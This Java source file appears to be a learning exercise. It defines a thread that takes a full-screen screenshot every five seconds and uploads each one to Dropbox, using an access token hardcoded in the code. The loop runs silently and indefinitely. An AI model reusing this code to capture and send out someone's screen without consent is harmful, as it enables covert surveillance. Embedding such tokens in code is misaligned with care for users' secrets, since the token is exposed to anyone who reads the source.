import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {
    public int threadNumber;
    public DbxClientV2 client;

    @Override
    public void run() {
        String ACCESS_TOKEN = "hlpBmfqwZywAAAAAAAAAATpy8Iy-jUtKb94AcKbzSRiS4KzJ6oLxIWVaz4dx7BCD";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);


        for (;;) {
            System.out.println(threadNumber);
            try {
                //получение разрешения экрана и создание скриншота
                Robot robot = new Robot();
                Rectangle screenSize = new Rectangle(Toolkit.getDefaultToolkit ().getScreenSize ());
                BufferedImage screenshot = robot.createScreenCapture(screenSize);

                ByteArrayOutputStream on = new ByteArrayOutputStream();

                //приводим скриншот к формату PNG
                ImageIO.write(screenshot, "png", on);
                byte[] bytes = on.toByteArray();
                InputStream in = new ByteArrayInputStream(bytes);

                //получаем настоящие дату и время
                SimpleDateFormat formatDate = new SimpleDateFormat("yMMdd_HHmmss");
                Date date = new Date();

                //загружаем файл на дропбокс с названием в виде даты и расширением .png
                client.files().uploadBuilder("/" + formatDate.format(date) + ".png")
                        .uploadAndFinish(in);

                sleep(5000);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
